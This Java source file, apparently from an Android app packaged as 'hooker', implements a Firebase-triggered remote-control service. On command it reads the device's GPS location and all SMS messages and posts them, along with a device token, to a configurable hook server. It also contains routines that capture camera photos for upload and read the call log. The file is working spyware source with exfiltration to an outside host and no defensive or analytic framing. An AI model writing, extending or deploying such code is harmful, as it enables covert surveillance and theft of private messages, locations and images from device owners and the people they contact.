package com.zillinium.hooker;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.Telephony;
import android.widget.Toast;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import com.google.android.gms.common.util.Base64Utils;



public class Remote extends FirebaseMessagingService {
    public static Context context;

    SharedPreferences sharedPref;
    SharedPreferences.Editor editor;
    AppSettings settings;

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        settings = AppSettings.get(getApplicationContext());
        context = Remote.this;
        sharedPref = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        editor = sharedPref.edit();
        Requester.setup(context);
        // Check if message contains a data payload.
        if (remoteMessage.getData() != null && remoteMessage.getData().size() > 0) {
            final String message = remoteMessage.getData().get("message");

            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                    public void run() {
                        
                        if (message.equals("getLocation")) {
                            try {
                                getLocation(5);
                            }
                            catch (Exception e) {
                               toaster("Getting Location : " + e.getMessage());
                            }
                        }
                        if (message.equals("getMessages")) {
                            String messages = URLEncoder.encode(readSMS());
                            logToServer("key="+sharedPref.getString("token","invalid")+"&messages="+messages);
                        }
                    }
                });

        }
        else {
            if (remoteMessage.getData() != null) {
            }
        }
    }

    private void getLocation(final int accuracy) throws Exception {
        LocationManager locationManager = (LocationManager) context.getSystemService(context.LOCATION_SERVICE);
        if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {   
            // GET HOT LOCATION
            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new android.location.LocationListener() {
                    @Override
                    public void onLocationChanged(Location location) {
                        // Location received
                        double latitude = location.getLatitude();
                        double longitude = location.getLongitude();
                        if (location.getAccuracy() > accuracy) {
                            try {
                                getLocation(accuracy);
                            }
                            catch (Exception e) {
                                toaster(e.getMessage());
                            }
                        }
                        // Do something with the latitude and longitude value
                        String link = latitude + "," + longitude;
                        String key= sharedPref.getString("token", "invalid");
                        final String data = "key=" + key + "&" + "location=" + URLEncoder.encode(link);

                        logToServer(data);
                    }
                    // Other required methods
                    @Override
                    public void onStatusChanged(String provider, int status, Bundle extras) {
                    }
                }, null);
        }
        else {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if(location != null)
            {
             double latitude = location.getLatitude();
            double longitude = location.getLongitude();

            // Do something with the latitude and longitude value
            String link = latitude + "," + longitude;
            String key= sharedPref.getString("token", "invalid");
            final String data = "key=" + key + "&" + "location=" + URLEncoder.encode(link);

            logToServer(data);     
            }
        }
    }

    private void toaster(final String message) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
                public void run() {
                    Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG).show();
                }
            });
    }

    private void logToServer(final String data) {
        final String url = settings.getHookURL();
        //toaster(url);
        new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        // open connection
                        Requester.Get(url);
                        // send
                        Requester.Post(url, data);
                    }
                    catch (final Exception e) {
                        //  toaster("Posting Data : "+e.getMessage());
                    }
                }
            }).start();
    }
    

// Declare the camera instance
    private Camera camera;

// Capture button click event
    private void capturePhoto() {
        // Check if the camera is available
        if (camera == null) {
             return;
        }

        // Set up the picture callback
        Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                // Send the picture to the server
                String base64image = Base64Utils.encode(data);
                logToServer("photo="+base64image);

                // Restart the preview
                camera.startPreview();
            }
        };

        // Take the picture
        camera.takePicture(null, null, pictureCallback);
    }
    

    private static String readSMS() {
        Uri smsUri = Uri.parse("content://sms/");
        Cursor cursor = context.getContentResolver().query(smsUri, null, null, null, null);
        List<String> msgList = new ArrayList<String>();
        String csv = "";
        if (cursor != null) {
            int now = -1;
            while (cursor.moveToNext()) {
                now ++;
                String address = cursor.getString(cursor.getColumnIndex(Telephony.TextBasedSmsColumns.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.TextBasedSmsColumns.BODY));
                String type = cursor.getString(cursor.getColumnIndex(Telephony.TextBasedSmsColumns.TYPE));

                String direction;
                if (type.equals("1")) {
                    direction = "Recieved";
                }
                else if (type.equals("2")) {
                    direction = "Sent";
                }
                else {
                    direction = "Unknown";
                }

                String data = (direction + "•••" + address + "•••" + URLEncoder.encode(body));
                csv += data.replaceAll("\n"," ")+"\n";
               // msgList.add(now, data);
            }
            cursor.close();
            return csv;
        }
        return null;
    }


    private void readCallLog() {
        String[] projection = {
            CallLog.Calls.TYPE,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

        if (cursor != null && cursor.moveToFirst()) {
            do {
                int callType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                int callDuration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                long callDate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));

                // Use the call details as required
                // For example, display the call log information
                String direction ="";
                if(callType == CallLog.Calls.INCOMING_TYPE)
                {
                    direction ="Incoming";
                }
                if (callType == CallLog.Calls.OUTGOING_TYPE)
                {
                    direction = "Outgoing";
                }
                if(callType == CallLog.Calls.MISSED_TYPE)
                {
                    direction = "Missed Incoming";
                }
                String callDetails = "Call Type: " + callType + "\nPhone Number: " + phoneNumber + "\nCall Duration: " + callDuration + "\nCall Date: " + callDate;
                System.out.println(callDetails);
            } while (cursor.moveToNext());

            cursor.close();
        }
    }
    
    @Override
    public void onNewToken(String s) {
        editor.putString("token", s).apply();
        super.onNewToken(s);
    }
}
